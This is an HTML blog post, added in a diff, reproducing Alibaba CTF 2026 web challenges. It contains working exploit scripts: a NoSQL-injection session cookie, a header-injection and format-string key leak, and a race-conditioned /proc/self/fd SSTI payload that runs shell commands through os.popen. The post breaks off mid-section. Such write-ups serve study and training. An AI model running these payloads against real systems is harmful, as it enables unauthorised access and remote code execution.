@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>阿里CTF 2026部分复现 - p0l1st&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="阿里CTF 2026部分复现 - p0l1st&#39;s blog" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2026/02/27/%E9%98%BF%E9%87%8CCTF-2026%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2026-02-27T09:15:29.000Z" />
+  
+  <meta property="og:article:author" content="p0l1st" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Blog</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="/friends" style="--index: 2">Friends</a>
+      
+      <a class="nav-item" href="/about" style="--index: 3">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/p0l1st" style="--index: 4"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 5"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2026-02-27T17:15:29+08:00">
+      February 27, 2026
+    </time>
+    
+
+    <h1 class="title">阿里CTF 2026部分复现</h1>
+  </div>
+
+  <div class="content">
+    <h1 id="Easy-Login"><a href="#Easy-Login" class="headerlink" title="Easy Login"></a>Easy Login</h1><p>懒得写详细了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> session = <span class="keyword">await</span> sessionsCollection.<span class="title function_">findOne</span>(&#123; sid &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>存在NoSQL注入</p>
+<p>那么先通过visit访问<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/%EF%BC%8Cbot%E5%88%99%E4%BC%9A%E7%99%BB%E5%BD%95admin%E5%9C%A8Mongo%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%94%9F%E6%88%90admin%E7%9A%84session">http://127.0.0.1:3000/，bot则会登录admin在Mongo数据库中生成admin的session</a></p>
+<p>然后通过构造Cookie: sid&#x3D;j:{“$ne”:null} 然后再访问&#x2F;admin即可</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://223.6.249.127:13173&quot;</span></span><br><span class="line">TIMEOUT = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 1. 触发 /visit 让服务器生成 session</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(</span><br><span class="line">            BASE + <span class="string">&quot;/visit&quot;</span>,</span><br><span class="line">            json=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:3000/&quot;</span>&#125;,</span><br><span class="line">            timeout=TIMEOUT</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 构造 sid = j:&#123;&quot;$ne&quot;: null&#125;</span></span><br><span class="line">    mongo_op = <span class="string">&quot;$ne&quot;</span></span><br><span class="line">    evil_cookie = <span class="string">&quot;j:&quot;</span> + json.dumps(&#123;mongo_op: <span class="literal">None</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 使用恶意 sid:&quot;</span>, evil_cookie)</span><br><span class="line"></span><br><span class="line">    r = requests.get(</span><br><span class="line">        BASE + <span class="string">&quot;/admin&quot;</span>,</span><br><span class="line">        headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;sid=&quot;</span> + evil_cookie&#125;,</span><br><span class="line">        timeout=TIMEOUT</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] /admin 返回内容：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Cutter"><a href="#Cutter" class="headerlink" title="Cutter"></a>Cutter</h1><p>源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">API_KEY = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1:5000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    token = request.headers.get(<span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token != API_KEY:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;unauth&#x27;</span>, <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    tmpl = request.values.get(<span class="string">&#x27;tmpl&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    tmpl_path = os.path.join(<span class="string">&#x27;./templates&#x27;</span>, tmpl)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(tmpl_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Not Found&#x27;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    tmpl_content = <span class="built_in">open</span>(tmpl_path, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tmpl_content), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/action&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;only localhost&#x27;</span>, <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    token = request.headers.get(<span class="string">&quot;X-Token&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token != API_KEY:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;unauth&#x27;</span>, <span class="number">403</span></span><br><span class="line">    </span><br><span class="line">    file = request.files.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    content = file.stream.read().decode()</span><br><span class="line"></span><br><span class="line">    action = request.files.get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">    act = json.loads(action.stream.read().decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> act[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;echo&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> content, <span class="number">200</span></span><br><span class="line">    <span class="keyword">elif</span> act[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;debug&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> content.<span class="built_in">format</span>(app), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;unkown action&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/heartbeat&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heartbeat</span>():</span><br><span class="line">    text = request.values.get(<span class="string">&#x27;text&#x27;</span>, <span class="string">&quot;default&quot;</span>)</span><br><span class="line">    client = request.values.get(<span class="string">&#x27;client&#x27;</span>, <span class="string">&quot;default&quot;</span>)</span><br><span class="line">    token = request.values.get(<span class="string">&#x27;token&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text) &gt; <span class="number">300</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text too large&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    action = json.dumps(&#123;<span class="string">&quot;type&quot;</span> : <span class="string">&quot;echo&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: (<span class="string">&#x27;content&#x27;</span>, BytesIO(text.encode()), <span class="string">&#x27;text/plain&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> : (<span class="string">&#x27;action&#x27;</span>, BytesIO(action.encode()), <span class="string">&#x27;text/json&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Token&quot;</span> : API_KEY,</span><br><span class="line">    &#125;</span><br><span class="line">    headers[client] = token</span><br><span class="line"></span><br><span class="line">    response = httpx.post(<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>/action&quot;</span>, headers=headers, files=form_data, timeout=<span class="number">10.0</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text, <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;action failed&#x27;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先是admin路由存在任意文件读取或SSTI(文件内容可控的前提下)</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717458.png" alt="image-20260208133054576"></p>
+<p>但是需要<code>API_KEY</code>，而<code>API_KEY</code>又是随机生成的</p>
+<p>往下看，action路由在debug模式下存在格式化字符串漏洞，可以泄露出全局变量中的<code>API_KEY</code></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717555.png" alt="image-20260208133256729"></p>
+<p>而action路由可以通过heartbeat路由来访问</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717496.png" alt="image-20260208133701328"></p>
+<p>这里默认硬编码了type为echo模式，但是headers可控，我们可以通过注入Content-Type头部来劫持数据包，设置<code>client=Content-Type</code> 和 <code>token=multipart/form-data; boundary=123</code>，然后设置text的值为<code>&#123;&quot;type&quot;:&quot;debug&quot;&#125;</code></p>
+<p>这样通过heartbeat请求action的时候会优先使用我们注入的<code>123</code>这部分作为Boundary，然后后端从text中读取action的值覆盖掉上面硬编码的echo模式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://223.6.249.127:18270&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key</span>():</span><br><span class="line">    payload = <span class="string">&quot;&#123;0.view_functions[index].__globals__[API_KEY]&#125;&quot;</span></span><br><span class="line">    </span><br><span class="line">    BOUNDARY = <span class="string">&quot;p0l1st&quot;</span></span><br><span class="line">    multipart_data = (</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;payload&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;BOUNDARY&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;action&quot;; filename=&quot;p0l1st.json&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&#123;&quot;type&quot;: &quot;debug&quot;&#125;\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;BOUNDARY&#125;</span>--\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;client&quot;</span>: <span class="string">&quot;content-type&quot;</span>, </span><br><span class="line">        <span class="string">&quot;token&quot;</span>: <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;BOUNDARY&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: multipart_data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.post(url+<span class="string">&quot;/heartbeat&quot;</span>,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717484.png" alt="image-20260208140932227"></p>
+<p>现在就可以任意文件读取了，但是问题是我们不知道flag叫什么</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717552.png" alt="image-20260208141028407"></p>
+<blockquote>
+<p>在 Linux 中，<code>/proc/self/fd/</code> 是当前进程“已打开文件”的快捷入口，<strong>一切皆文件</strong>：普通文件、Socket、管道都算。<br>通常 <strong>FD 0&#x2F;1&#x2F;2</strong> 是标准输入、输出、错误；<strong>FD 3</strong> 往往是服务监听用的 Socket；而 <strong>FD 4–10</strong> 多半是当前请求相关的资源，比如 <code>wsgi.input</code>（HTTP 请求体的输入流）或请求体过大时生成的临时缓存文件。通过这些 FD，进程可以在不重新打开路径的情况下直接读写对应资源。</p>
+</blockquote>
+<p>那么我们可以构造一个比较大的请求体，里面有我们的SSTI Payload，这样的话fd某个值就会包含这个payload，再通过读这个fd的内容来通过SSTI进行rce，这个发包并读取的过程需要条件竞争</p>
+<p>官方exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://223.6.249.127:18270&#x27;</span></span><br><span class="line"></span><br><span class="line">STOP_SIGNAL = <span class="literal">True</span></span><br><span class="line">STOP_MAIN = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    boundary = <span class="string">&quot;asdasdasd&quot;</span></span><br><span class="line">    <span class="comment"># 覆盖 action 字段</span></span><br><span class="line">    text = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;&#123;0.__class__.__init__.__globals__[sys].modules[__main__].API_KEY&#125;&#125;</span></span><br><span class="line"><span class="string">--<span class="subst">&#123;boundary&#125;</span></span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;action&quot;; filename=&quot;action&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&quot;type&quot;:&quot;debug&quot;&#125;&#125;</span></span><br><span class="line"><span class="string">--<span class="subst">&#123;boundary&#125;</span>--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip()</span><br><span class="line">    header = <span class="string">&quot;Content-Type&quot;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;client&quot;</span> : header,</span><br><span class="line">        <span class="string">&quot;token&quot;</span> : <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span> : text</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url + <span class="string">&#x27;/heartbeat&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">command : <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="comment"># 发送大文件</span></span><br><span class="line">    size = <span class="number">500</span> * <span class="number">1024</span> + <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&quot;&lt;start&gt;&quot;</span> + <span class="string">b&quot; &quot;</span>*size + <span class="string">b&quot;&lt;end&gt;&quot;</span> + <span class="string">b&quot;&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + command.encode() + <span class="string">b&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;payload&quot;</span> : (<span class="string">&quot;payload&quot;</span>, BytesIO(payload), <span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url=url + <span class="string">&#x27;/heartbeat&#x27;</span>, files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">key : <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> STOP_SIGNAL</span><br><span class="line">    <span class="keyword">global</span> STOP_MAIN</span><br><span class="line">    <span class="keyword">while</span> STOP_SIGNAL:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url=url + <span class="string">&#x27;/admin&#x27;</span>, params=&#123;</span><br><span class="line">                <span class="string">&quot;tmpl&quot;</span> : <span class="string">&quot;/proc/self/fd/5&quot;</span></span><br><span class="line">            &#125;, headers=&#123;</span><br><span class="line">                <span class="string">&quot;Authorization&quot;</span> : key</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&lt;end&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> + res.text.split(<span class="string">&#x27;&lt;end&gt;&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">                STOP_SIGNAL = <span class="literal">False</span></span><br><span class="line">                STOP_MAIN = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    command = <span class="string">&quot;cat /flag*&quot;</span></span><br><span class="line"></span><br><span class="line">    API_KEY = get_key()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;API_KEY : <span class="subst">&#123;API_KEY&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> STOP_MAIN:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            STOP_SIGNAL = <span class="literal">True</span></span><br><span class="line">            total = total + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;<span class="built_in">str</span>(total)&#125;</span>次尝试&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            t = threading.Thread(target=render, args=(API_KEY, ))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">            send(command)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            STOP_SIGNAL = <span class="literal">False</span></span><br><span class="line">            t.join()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717590.png" alt="image-20260208144921062"></p>
+<h1 id="Fileury"><a href="#Fileury" class="headerlink" title="Fileury"></a>Fileury</h1><p><code>com.app.UndertowRoutingServer</code>存在Apache Fury反序列化</p>
